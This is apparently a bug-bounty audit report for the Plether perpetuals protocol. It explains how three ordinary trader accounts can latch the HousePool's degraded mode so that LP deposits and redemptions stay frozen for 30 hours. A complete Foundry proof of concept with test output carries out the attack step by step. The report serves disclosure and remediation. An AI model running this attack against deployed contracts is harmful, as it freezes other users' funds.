# \#99408 [SC-High] An unprivileged hedged portfolio can latch degraded mode and block uncancellable LP escrow for over 24 hours

**Submitted on Nov 13th 2026 at 14:38:51 UTC by @Kirkeelee for [Audit Competition | Plether](https://immunefi.com/audit-competition/plether)**

- **Report ID:** #99408
- **Report Type:** Smart Contract
- **Report severity:** High
- **Target:** https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src/HousePool.sol
- **Impacts:**
  - Temporary freezing of funds for at least 24 hours

## Description

## Brief / Intro

A trader can build an admitted portfolio close to the pool's buffered liability limit, then close a profitable position on the smaller-liability side after a 0.75% basket rise. The payout reduces effective pool cash without reducing the larger side's maximum-profit envelope. This latches degraded mode and prevents every LP epoch from settling. Pending LP deposits and redemption requests that have matured cannot be cancelled by their owners.

The remaining attacker positions are healthy and cannot be liquidated. The PoC keeps LP escrow blocked for 30 hours despite fresh oracle updates, carry checkpoints, and hourly liquidation attempts. Restoring the conservative solvency condition and clearing the latch requires attacker cooperation or owner recovery.

## Vulnerability Details

The pool's admission rule uses:

```text
E = pool.totalAssets() - totalTraderClaimBalanceAssets
L = max(longSide.maxProfitAssets, shortSide.maxProfitAssets)
B = ceil(L * settlementBufferBps / 10_000)

An open requires post-operation E >= L + B.
```

At the release setting, `settlementBufferBps = 25`. `L` is a maximum across sides; closing a position on the smaller side need not reduce it. A profitable close pays from pool cash or records a senior trader claim, reducing `E`. When the close leaves `E < L`, `_enterDegradedModeIfInsolvent` sets the sticky latch.

`HousePool._settleLpEpoch` checks `_requireWithdrawalsLive` before reconciliation, deposit activation, or redemption funding. While degraded, it reverts. `TrancheVault.cancelPendingDeposit` does not provide a degraded-mode cancellation escape for the demonstrated matured, unimpaired requests. `cancelRedeemRequest` rejects matured redemption requests. Both LP assets and shares therefore remain in escrow without a user-controlled exit.

The attack uses three ordinary trader accounts and the normal commit/execution path:

1. With approximately 2,000,000 USDG of LP liquidity, open LONG and SHORT positions. Increase the LONG side near the buffered admission limit. The build finishes with `E = 2,001,516.097428` USDG and `L = 1,993,920` USDG; degraded mode is false.
2. After a 0.75% basket rise, close the separate SHORT trigger position. Its payout leaves `E = 1,991,369.028564` USDG while the LONG-side `L` remains `1,993,920` USDG. Degraded mode latches.
3. Retain the healthy LONG and remaining SHORT. Ordinary keepers cannot force either to close: liquidation reverts with `CfdEngine__PositionIsSolvent`.
4. Keep the oracle fresh and checkpoint carry. Matured LP deposit and redemption requests remain blocked for the tested 30-hour interval.

The immediate owner clear attempt in the original PoC reverts `CfdEngine__StillInsolvent`. If the attacker closes its portfolio, the conservative solvency condition recovers, but the latch still requires an owner transaction to clear.

## Impact Details

- A 50,000 USDG Junior deposit, a 50,000 USDG Senior deposit, and a matured Junior redemption remain uncancellable and unserviceable for 30 hours in the recheck.
- All LP epoch settlement is blocked during the interval, including new redemption funding and deposit activation.
- Fresh marks, carry checkpoints, and liquidation attempts do not restore LP service.
- Already-funded LP claims and trader closes remain available.
- Attacker cost in the PoC: the three accounts start with `600,000` USDG and end the full scenario (build, trigger, unwind) with `596,325.225934` USDG, a net `3,674.774066` USDG, excluding gas and oracle fees.
- Preconditions: the admitted portfolio, a 0.75% basket rise, and a stable price over the following interval. No privileged action is used.


## Proof of Concept

## Proof of Concept
Save both files below in the repository-root `test/scripts/` directory (next to `MockUSDGPerpsLifecycle.t.sol`, whose release-deployment setup they copy) and run from the repository root:

```bash
forge test --match-path test/scripts/ReviewF2Maintenance.t.sol -vv
```

`ReviewF2Maintenance` inherits `DegradedLatchPoC`, so this runs all three tests.

- `test_Control_NoAttacker_EpochSettles`: without the attacker, the LP epoch settles.
- `test_AttackerLatchesDegradedMode_FreezesLpsUntilOwnerActs`: the attack above. The LP deposits and redemption stay blocked for 30 hours and the owner's clear reverts.
- `test_Recheck_F2_KeeperMaintenanceDoesNotReleaseLPEscrow`: every hour for 30 hours, refreshes the mark, checkpoints carry and tries to liquidate both attacker positions. The liquidations revert and LP settlement and cancellation stay blocked.

`test/scripts/DegradedLatchPoC.t.sol`:

```solidity
// SPDX-License-Identifier: UNLICENSED
pragma solidity 0.8.35;

import {DeployPerpsArbitrumSepolia, MockUSDG} from "../../script/DeployPerpsArbitrumSepolia.s.sol";
import {MockPyth} from "../mocks/MockPyth.sol";
import {CfdEngine} from "@plether/perps/CfdEngine.sol";
import {CfdTypes} from "@plether/perps/CfdTypes.sol";
import {EmergencyPauseCoordinator} from "@plether/perps/EmergencyPauseCoordinator.sol";
import {HousePool} from "@plether/perps/HousePool.sol";
import {MarginClearinghouse} from "@plether/perps/MarginClearinghouse.sol";
import {OrderLifecycleBook} from "@plether/perps/OrderLifecycleBook.sol";
import {OrderRouter} from "@plether/perps/OrderRouter.sol";
import {OrderV3Types} from "@plether/perps/OrderV3Types.sol";
import {PletherOracle} from "@plether/perps/PletherOracle.sol";
import {TerminalNavBookV2} from "@plether/perps/TerminalNavBookV2.sol";
import {TrancheVault} from "@plether/perps/TrancheVault.sol";
import {IHousePool} from "@plether/perps/interfaces/IHousePool.sol";
import {ICfdEngineTypes} from "@plether/perps/interfaces/ICfdEngineTypes.sol";
import {Test} from "forge-std/Test.sol";
import {console2} from "forge-std/console2.sol";

/// @dev Mirrors the Arbitrum precompile's block-number view inside the local test EVM.
contract PoCArbSys {
    function arbBlockNumber() external view returns (uint256) {
        return block.number;
    }
}

/// @notice Same setup as the repo's test/scripts/MockUSDGPerpsLifecycle.t.sol: runs the release deploy script
/// (script/DeployPerpsArbitrumSepolia.s.sol, release parameters) inside the test EVM. Only Pyth and USDG are mocks.
/// Adds 1,000,000 USDG of Junior and 1,000,000 USDG of Senior liquidity through the normal async LP flow.
abstract contract ReleaseStackPoCBase is Test {
    address internal constant RELEASE_PYTH = 0x0B73614636C855Bf23F342F307FB981A3e47f42B;
    address internal constant ARBSYS = address(100);
    uint256 internal constant DEPLOYER_KEY = 0xA11CE;
    /// @dev Monday 2024-03-04 10:00 UTC (FX market open, no FAD window) — same anchor as the repo tests.
    uint256 internal constant MONDAY_MORNING = 1_709_532_000;
    uint256 internal constant CAP_PRICE = 2e8;
    uint256 internal constant START_PRICE = 120_000_000; // basket mark 1.20 (8 decimals)
    uint256 internal constant SIZE_QUANTUM = 100e18; // positionSizeQuantum = 1e20 raw units
    uint256 internal constant JUNIOR_LP_ASSETS = 1_000_000e6;
    uint256 internal constant SENIOR_LP_ASSETS = 1_000_000e6;
    uint8 internal constant MODE_LIVE = 1; // allowedExecutionModes bit for ExecutionMode.Live (1 << (Live-1))
    uint8 internal constant MODES_ALL = 7; // Live | Fad | Frozen

    DeployPerpsArbitrumSepolia.DeployedContracts internal stack;
    MockUSDG internal usdg;
    CfdEngine internal engine;
    HousePool internal pool;
    TrancheVault internal seniorVault;
    TrancheVault internal juniorVault;
    MarginClearinghouse internal clearinghouse;
    OrderRouter internal router;
    OrderLifecycleBook internal lifecycleBook;
    TerminalNavBookV2 internal navBook;
    EmergencyPauseCoordinator internal coordinator;
    PletherOracle internal oracle;
    MockPyth internal pyth;

    /// Trusted roles: OWNER (deployer, owner of every perps contract) and GUARDIAN.
    address internal OWNER;
    address internal GUARDIAN;
    /// Untrusted actors (anyone can be a keeper).
    address internal KEEPER;
    address internal JUNIOR_LP;
    address internal SENIOR_LP;

    uint256 internal currentBasketPrice;
    uint256 internal _clientNonce;

    function setUp() public virtual {
        vm.chainId(421_614);
        vm.warp(MONDAY_MORNING);
        vm.etch(ARBSYS, address(new PoCArbSys()).code);
        vm.etch(RELEASE_PYTH, address(new MockPyth()).code);
        pyth = MockPyth(RELEASE_PYTH);
        vm.setEnv("TEST_PRIVATE_KEY", vm.toString(DEPLOYER_KEY));
        stack = DeployPerpsArbitrumSepolia(
            deployCode("DeployPerpsArbitrumSepolia.s.sol:DeployPerpsArbitrumSepolia")
        ).run();

        usdg = stack.settlementToken;
        engine = stack.engine;
        pool = stack.housePool;
        seniorVault = stack.seniorVault;
        juniorVault = stack.juniorVault;
        clearinghouse = stack.clearinghouse;
        router = stack.router;
        lifecycleBook = stack.lifecycleBook;
        navBook = stack.terminalNavBook;
        coordinator = stack.emergencyPauseCoordinator;
        oracle = PletherOracle(stack.pletherOracle);

        OWNER = vm.addr(DEPLOYER_KEY);
        GUARDIAN = makeAddr("guardian");
        KEEPER = makeAddr("keeper");
        JUNIOR_LP = makeAddr("juniorLP");
        SENIOR_LP = makeAddr("seniorLP");
        vm.label(OWNER, "OWNER");

        // Production bootstrap (DEPLOYMENT.md): guardian set, 1 USDG permanent seed per tranche, trading activated.
        vm.startPrank(OWNER);
        coordinator.setGuardian(GUARDIAN);
        usdg.mint(OWNER, 2e6);
        usdg.approve(address(pool), 2e6);
        pool.initializeSeedPosition(false, 1e6, OWNER);
        pool.initializeSeedPosition(true, 1e6, OWNER);
        pool.activateTrading();
        vm.stopPrank();

        _setBasketPrice(START_PRICE);
        router.updateMarkPrice(_updateData());

        // Ordinary LP liquidity through the async epoch flow (Junior first, then Senior), like the v2.0.0 testnet.
        _lpDeposit(juniorVault, JUNIOR_LP, JUNIOR_LP_ASSETS);
        _lpDeposit(seniorVault, SENIOR_LP, SENIOR_LP_ASSETS);
    }

    // ------------------------------------------------------------------ oracle -----------------------------------
    /// @notice Moves every release feed by the same normalized factor so the basket mark becomes `basketPrice`
    /// (8 decimals), publishTime = now. Inverse FX feeds keep their own units. Does NOT push it on-chain: pass
    /// `_updateData()` to a Router call (executeOrder / updateMarkPrice / settleLpEpoch / liquidation).
    function _setBasketPrice(uint256 basketPrice) internal {
        _setBasketPriceAt(basketPrice, vm.getBlockTimestamp());
    }

    function _setBasketPriceAt(uint256 basketPrice, uint256 publishTime) internal {
        currentBasketPrice = basketPrice;
        for (uint256 i; i < 6; ++i) {
            uint256 normalizedPrice = oracle.basePrices(i) * basketPrice / 1e8;
            uint256 feedPrice = oracle.inversions(i) ? 1e16 / normalizedPrice : normalizedPrice;
            pyth.setPrice(oracle.pythFeedIds(i), int64(uint64(feedPrice)), int32(-8), publishTime);
        }
    }

    /// @dev Non-encoded payload: MockPyth answers with the individually configured feed prices.
    function _updateData() internal pure returns (bytes[] memory data) {
        data = new bytes[](1);
        data[0] = "";
    }

    function _pushMark(uint256 basketPrice) internal {
        _setBasketPrice(basketPrice);
        vm.prank(KEEPER);
        router.updateMarkPrice(_updateData());
    }

    // ------------------------------------------------------------------ LPs --------------------------------------
    /// @notice requestDeposit -> warp to the target epoch -> keeper settles via Router (atomic oracle refresh) -> claim.
    function _lpDeposit(TrancheVault vault, address lp, uint256 assets) internal returns (uint256 shares) {
        usdg.mint(lp, assets);
        vm.startPrank(lp);
        usdg.approve(address(vault), assets);
        uint256 requestId = vault.requestDeposit(assets, lp, lp);
        vm.stopPrank();
        _settleEpoch(requestId);
        vm.prank(lp);
        shares = vault.claimDeposit(requestId, assets, lp, lp);
    }

    /// @notice requestRedeem (after the deposit cooldown) -> settle the target epoch -> returns requestId (claim it
    /// yourself with vault.claimRedeem(requestId, shares, lp, lp)).
    function _lpRequestRedeemAndSettle(TrancheVault vault, address lp, uint256 shares)
        internal
        returns (uint256 requestId)
    {
        uint256 cooldownEnd = vault.lastDepositTime(lp) + vault.DEPOSIT_COOLDOWN();
        if (vm.getBlockTimestamp() < cooldownEnd) vm.warp(cooldownEnd);
        vm.prank(lp);
        requestId = vault.requestRedeem(shares, lp, lp);
        _settleEpoch(requestId);
    }

    function _settleEpoch(uint256 epochId) internal {
        uint256 start = pool.lpEpochStart(epochId);
        if (vm.getBlockTimestamp() < start) vm.warp(start);
        vm.roll(vm.getBlockNumber() + 1);
        _setBasketPrice(currentBasketPrice);
        vm.prank(KEEPER);
        router.settleLpEpoch(_updateData());
    }

    // ------------------------------------------------------------------ traders ----------------------------------
    function _fundTrader(address trader, uint256 assets) internal {
        usdg.mint(trader, assets);
        vm.startPrank(trader);
        usdg.approve(address(clearinghouse), assets);
        clearinghouse.depositMargin(assets);
        vm.stopPrank();
    }

    /// @notice Permissive bounds (live mode only by default); tighten fields in your own request if the test needs to.
    function _bounds(uint256 maxPostSize) internal view returns (OrderV3Types.ExecutionBounds memory b) {
        b = OrderV3Types.ExecutionBounds({
            submitBy: uint64(vm.getBlockTimestamp() + 60),
            executionWindowSeconds: 60,
            allowedExecutionModes: MODE_LIVE,
            expectedConfigHash: lifecycleBook.currentExecutionConfigHash(),
            maxExecutionBountyAssets: type(uint128).max,
            maxExecutionNotionalAssets: type(uint128).max,
            maxGrossAccountDebitAssets: type(uint128).max,
            maxActionChargeAssets: type(uint128).max,
            maxExplicitFeesAssets: type(uint128).max,
            maxPostPositionSize: maxPostSize,
            minPostSettlementBalanceAssets: 0,
            minPostPositionEquityAssets: 0,
            maxPostLeverageBps: type(uint32).max
        });
    }

    /// @dev LONG gains when the basket falls: an opening LONG accepts any fill >= targetPrice, a closing LONG any
    /// fill <= targetPrice (and the reverse for SHORT). Permissive targets: 1 / CAP_PRICE.
    function _permissiveTarget(CfdTypes.Side side, bool isClose) internal pure returns (uint256) {
        bool wantsHigh = (side == CfdTypes.Side.LONG) != isClose;
        return wantsHigh ? 1 : CAP_PRICE;
    }

    function _commit(address trader, CfdTypes.Side side, uint256 sizeDelta, uint256 marginDelta, bool isClose)
        internal
        returns (uint64 orderId)
    {
        OrderV3Types.OrderRequest memory request;
        request.clientOrderId = keccak256(abi.encode("poc", trader, ++_clientNonce));
        request.side = side;
        request.sizeDelta = sizeDelta;
        request.marginDelta = marginDelta;
        request.targetPrice = _permissiveTarget(side, isClose);
        request.isClose = isClose;
        request.bounds = _bounds(isClose ? type(uint128).max : type(uint128).max);
        vm.prank(trader);
        orderId = router.commitOrder(request);
    }

    /// @notice Keeper executes `orderId` at basket price `fillPrice` after the minimum delay (7 s, 2 blocks).
    function _execute(uint64 orderId, uint256 fillPrice) internal returns (OrderV3Types.ExecutionResult memory r) {
        vm.warp(vm.getBlockTimestamp() + 7);
        vm.roll(vm.getBlockNumber() + 2);
        _setBasketPrice(fillPrice);
        vm.prank(KEEPER);
        r = router.executeOrder(orderId, _updateData());
    }

    function _open(address trader, CfdTypes.Side side, uint256 size, uint256 margin, uint256 fillPrice)
        internal
        returns (OrderV3Types.ExecutionResult memory r)
    {
        r = _execute(_commit(trader, side, size, margin, false), fillPrice);
    }

    function _close(address trader, CfdTypes.Side side, uint256 size, uint256 fillPrice)
        internal
        returns (OrderV3Types.ExecutionResult memory r)
    {
        r = _execute(_commit(trader, side, size, 0, true), fillPrice);
    }

    function _positionSize(address trader) internal view returns (uint256 size) {
        (size,,,,,,) = engine.positions(trader);
    }

    function _assertExecuted(OrderV3Types.ExecutionResult memory r, string memory what) internal pure {
        assertEq(uint8(r.status), uint8(OrderV3Types.LifecycleStatus.Executed), what);
    }
}


/// Unprivileged traders latch CfdEngine.degradedMode on purpose. Release parameters, release deploy script.
contract DegradedLatchPoC is ReleaseStackPoCBase {
    address internal A_LONG = makeAddr("attackerLong");
    address internal A_HEDGE = makeAddr("attackerHedgeShort");
    address internal A_TRIGGER = makeAddr("attackerTriggerShort");
    address internal VICTIM_TRADER = makeAddr("victimTrader");
    address internal LP_JUNIOR_NEW = makeAddr("newJuniorDepositor");
    address internal LP_SENIOR_NEW = makeAddr("newSeniorDepositor");

    uint256 internal juniorDepositId;
    uint256 internal seniorDepositId;
    uint256 internal juniorRedeemId;
    uint256 internal movedPrice;

    function _E() internal view returns (uint256) {
        return pool.totalAssets() - engine.totalTraderClaimBalanceAssets();
    }

    function _L() internal view returns (uint256) {
        (uint256 longMax,,,) = engine.sides(0);
        (uint256 shortMax,,,) = engine.sides(1);
        return longMax > shortMax ? longMax : shortMax;
    }

    function _attackerFunds() internal view returns (uint256) {
        return clearinghouse.balanceAssets(A_LONG) + clearinghouse.balanceAssets(A_HEDGE)
            + clearinghouse.balanceAssets(A_TRIGGER);
    }

    function _tick(uint256 dt) internal {
        vm.warp(vm.getBlockTimestamp() + dt);
        vm.roll(vm.getBlockNumber() + 1);
    }

    /// Ordinary users: two new LP deposits, one Junior redemption, one small trader. All before the attack.
    function _victimsAct() internal {
        uint256 cooldownEnd = juniorVault.lastDepositTime(JUNIOR_LP) + juniorVault.DEPOSIT_COOLDOWN();
        if (vm.getBlockTimestamp() < cooldownEnd) vm.warp(cooldownEnd);
        // Start of a fresh LP epoch, so every request below targets the next epoch.
        vm.warp((vm.getBlockTimestamp() / 1 hours + 1) * 1 hours + 60);
        vm.roll(vm.getBlockNumber() + 1);
        _pushMark(START_PRICE);

        usdg.mint(LP_JUNIOR_NEW, 50_000e6);
        vm.startPrank(LP_JUNIOR_NEW);
        usdg.approve(address(juniorVault), 50_000e6);
        juniorDepositId = juniorVault.requestDeposit(50_000e6, LP_JUNIOR_NEW, LP_JUNIOR_NEW);
        vm.stopPrank();

        usdg.mint(LP_SENIOR_NEW, 50_000e6);
        vm.startPrank(LP_SENIOR_NEW);
        usdg.approve(address(seniorVault), 50_000e6);
        seniorDepositId = seniorVault.requestDeposit(50_000e6, LP_SENIOR_NEW, LP_SENIOR_NEW);
        vm.stopPrank();

        uint256 redeemShares = juniorVault.balanceOf(JUNIOR_LP) / 10;
        vm.prank(JUNIOR_LP);
        juniorRedeemId = juniorVault.requestRedeem(redeemShares, JUNIOR_LP, JUNIOR_LP);

        _fundTrader(VICTIM_TRADER, 10_000e6);
        _assertExecuted(_open(VICTIM_TRADER, CfdTypes.Side.SHORT, 10_000e18, 1_000e6, START_PRICE), "victim open");
    }

    /// Attacker: three unprivileged accounts. LONG sized to the edge of the 25 bps open buffer, plus SHORTs.
    function _attackerBuilds() internal {
        _fundTrader(A_LONG, 400_000e6);
        _fundTrader(A_HEDGE, 100_000e6);
        _fundTrader(A_TRIGGER, 100_000e6);

        _assertExecuted(_open(A_HEDGE, CfdTypes.Side.SHORT, 600_000e18, 20_000e6, START_PRICE), "hedge 1");
        _assertExecuted(_open(A_LONG, CfdTypes.Side.LONG, 1_200_000e18, 100_000e6, START_PRICE), "long 1");
        _assertExecuted(_open(A_HEDGE, CfdTypes.Side.SHORT, 600_000e18, 20_000e6, START_PRICE), "hedge 2");

        // LONG max profit == LONG entry cost. Raise it to just under E / 1.0025 (opens need E >= L + 0.25% L).
        (uint256 longMax,,,) = engine.sides(0);
        uint256 target = _E() * 10_000 / 10_025 - 1_000e6;
        uint256 lots = (target - longMax) / START_PRICE;
        _assertExecuted(_open(A_LONG, CfdTypes.Side.LONG, lots * 100e18, 50_000e6, START_PRICE), "long 2");

        _assertExecuted(_open(A_TRIGGER, CfdTypes.Side.SHORT, 1_100_000e18, 30_000e6, START_PRICE), "trigger short");
    }

    function _expectFrozen() internal {
        // 1. No LP epoch can settle: no deposit is activated, no redemption is funded.
        _pushMark(movedPrice);
        vm.prank(KEEPER);
        vm.expectRevert(IHousePool.HousePool__DegradedMode.selector);
        router.settleLpEpoch(_updateData());

        // 2. The matured requests cannot be cancelled either.
        vm.prank(LP_JUNIOR_NEW);
        vm.expectRevert(TrancheVault.TrancheVault__DepositEpochAlreadyActive.selector);
        juniorVault.cancelPendingDeposit(juniorDepositId);

        vm.prank(LP_SENIOR_NEW);
        vm.expectRevert(TrancheVault.TrancheVault__SeniorDepositCommitted.selector);
        seniorVault.cancelPendingDeposit(seniorDepositId);

        vm.prank(JUNIOR_LP);
        vm.expectRevert(TrancheVault.TrancheVault__RedeemCancellationUnavailable.selector);
        juniorVault.cancelRedeemRequest(juniorRedeemId, JUNIOR_LP);

        // 3. A trader with an open position cannot withdraw free settlement.
        vm.prank(VICTIM_TRADER);
        vm.expectRevert(ICfdEngineTypes.CfdEngine__DegradedMode.selector);
        clearinghouse.withdrawMargin(1_000e6);
    }

    /// Control: same users, same price move, no attacker. The epoch settles and everyone is served.
    function test_Control_NoAttacker_EpochSettles() public {
        _victimsAct();
        movedPrice = START_PRICE * 10_075 / 10_000;
        _tick(3);
        _pushMark(movedPrice);
        assertFalse(engine.degradedMode());

        vm.warp((vm.getBlockTimestamp() / 1 hours + 1) * 1 hours + 1);
        vm.roll(vm.getBlockNumber() + 1);
        _setBasketPrice(movedPrice);
        vm.prank(KEEPER);
        router.settleLpEpoch(_updateData());

        vm.prank(LP_JUNIOR_NEW);
        assertGt(juniorVault.claimDeposit(juniorDepositId, 50_000e6, LP_JUNIOR_NEW, LP_JUNIOR_NEW), 0, "deposit activated");
        vm.prank(VICTIM_TRADER);
        clearinghouse.withdrawMargin(1_000e6);
    }

    function test_AttackerLatchesDegradedMode_FreezesLpsUntilOwnerActs() public {
        _victimsAct();
        uint256 attackerStart = 600_000e6;
        _attackerBuilds();
        assertFalse(engine.degradedMode(), "healthy after the build");
        console2.log("after build   E      ", _E());
        console2.log("after build   L      ", _L());
        console2.log("after build   E - L  ", _E() - _L());

        // The market moves +0.75%. The attacker closes the trigger SHORT; its profit is paid from pool cash.
        // L (the LONG side) does not change, so E drops below L and the latch is set.
        uint256 shortSize = _positionSize(A_TRIGGER);
        movedPrice = START_PRICE * 10_075 / 10_000;
        _tick(3);
        _pushMark(movedPrice);
        _assertExecuted(_close(A_TRIGGER, CfdTypes.Side.SHORT, shortSize, movedPrice), "trigger short close");
        assertTrue(engine.degradedMode(), "degraded mode latched by the attacker's close");
        console2.log("after trigger E      ", _E());
        console2.log("after trigger L      ", _L());
        console2.log("after trigger L - E  ", _L() - _E());

        // The owner cannot simply clear it while the attacker's LONG is open.
        vm.prank(OWNER);
        vm.expectRevert(ICfdEngineTypes.CfdEngine__StillInsolvent.selector);
        engine.clearDegradedMode();

        // The requests mature. For the next 26 hours nothing can be settled, cancelled or withdrawn.
        vm.warp((vm.getBlockTimestamp() / 1 hours + 1) * 1 hours + 1);
        vm.roll(vm.getBlockNumber() + 1);
        uint256 frozenFrom = vm.getBlockTimestamp();
        for (uint256 h; h < 26; ++h) {
            _expectFrozen();
            _tick(1 hours);
        }

        // The attacker leaves: every position closed, E >= L again. The latch stays.
        _assertExecuted(_close(A_LONG, CfdTypes.Side.LONG, _positionSize(A_LONG), movedPrice), "long close");
        _assertExecuted(_close(A_HEDGE, CfdTypes.Side.SHORT, _positionSize(A_HEDGE), movedPrice), "hedge close");
        assertGe(_E(), _L(), "solvent again");
        assertTrue(engine.degradedMode(), "latch is sticky");
        for (uint256 h; h < 4; ++h) {
            _expectFrozen();
            _tick(1 hours);
        }
        console2.log("hours frozen          ", (vm.getBlockTimestamp() - frozenFrom) / 1 hours);
        console2.log("attacker funds start  ", attackerStart);
        console2.log("attacker funds end    ", _attackerFunds());

        // Only the owner ends it.
        vm.prank(OWNER);
        engine.clearDegradedMode();
        _setBasketPrice(movedPrice);
        vm.prank(KEEPER);
        router.settleLpEpoch(_updateData());
        vm.prank(LP_JUNIOR_NEW);
        assertGt(juniorVault.claimDeposit(juniorDepositId, 50_000e6, LP_JUNIOR_NEW, LP_JUNIOR_NEW), 0, "served after owner clears");
    }
}
```

`test/scripts/ReviewF2Maintenance.t.sol`:

```solidity
// SPDX-License-Identifier: UNLICENSED
pragma solidity 0.8.35;
import {DegradedLatchPoC} from "./DegradedLatchPoC.t.sol";
import {CfdTypes} from "@plether/perps/CfdTypes.sol";
import {ICfdEngineTypes} from "@plether/perps/interfaces/ICfdEngineTypes.sol";
import {console2} from "forge-std/console2.sol";
contract ReviewF2Maintenance is DegradedLatchPoC {
    function test_Recheck_F2_KeeperMaintenanceDoesNotReleaseLPEscrow() public {
        _victimsAct();
        _attackerBuilds();
        movedPrice = START_PRICE * 10_075 / 10_000;
        _tick(3);
        _pushMark(movedPrice);
        _assertExecuted(_close(A_TRIGGER, CfdTypes.Side.SHORT, _positionSize(A_TRIGGER), movedPrice), "trigger");
        assertTrue(engine.degradedMode());

        ICfdEngineTypes.TerminalNavSnapshot memory snapshot = engine.terminalNavSnapshot();
        int256 terminalEquity = int256(pool.totalAssets()) - int256(snapshot.totalTraderClaimsAssets)
            + snapshot.terminalLpPriceDeltaAssets;
        assertGt(terminalEquity, 0, "the latch does not prove negative terminal LP equity");
        console2.log("terminal LP equity after trigger", uint256(terminalEquity));

        vm.warp(pool.lpEpochStart(juniorDepositId) + 1);
        vm.roll(vm.getBlockNumber() + 1);
        uint256 start = vm.getBlockTimestamp();
        for (uint256 h; h < 30; ++h) {
            _expectFrozen();
            vm.prank(KEEPER);
            engine.checkpointCarryIndexes();
            vm.prank(KEEPER);
            vm.expectRevert(ICfdEngineTypes.CfdEngine__PositionIsSolvent.selector);
            router.executeLiquidation(A_LONG, _updateData());
            vm.prank(KEEPER);
            vm.expectRevert(ICfdEngineTypes.CfdEngine__PositionIsSolvent.selector);
            router.executeLiquidation(A_HEDGE, _updateData());
            assertTrue(engine.degradedMode());
            _tick(1 hours);
        }
        assertEq(vm.getBlockTimestamp() - start, 30 hours);
        assertEq(_positionSize(A_LONG) > 0, true);
        assertEq(_positionSize(A_HEDGE) > 0, true);
        console2.log("LP escrow remains blocked with active keepers, hours", (vm.getBlockTimestamp() - start) / 1 hours);
    }
}
```

Output (commit a82d4fef):

```
Ran 3 tests for test/scripts/ReviewF2Maintenance.t.sol:ReviewF2Maintenance
[PASS] test_AttackerLatchesDegradedMode_FreezesLpsUntilOwnerActs() (gas: 112955797)
Logs:
  after build   E       2001516097428
  after build   L       1993920000000
  after build   E - L   7596097428
  after trigger E       1991369028564
  after trigger L       1993920000000
  after trigger L - E   2550971436
  hours frozen           30
  attacker funds start   600000000000
  attacker funds end     596325225934

[PASS] test_Control_NoAttacker_EpochSettles() (gas: 9325216)
[PASS] test_Recheck_F2_KeeperMaintenanceDoesNotReleaseLPEscrow() (gas: 139806436)
Logs:
  terminal LP equity after trigger 1995433428564
  LP escrow remains blocked with active keepers, hours 30

Suite result: ok. 3 passed; 0 failed; 0 skipped
```

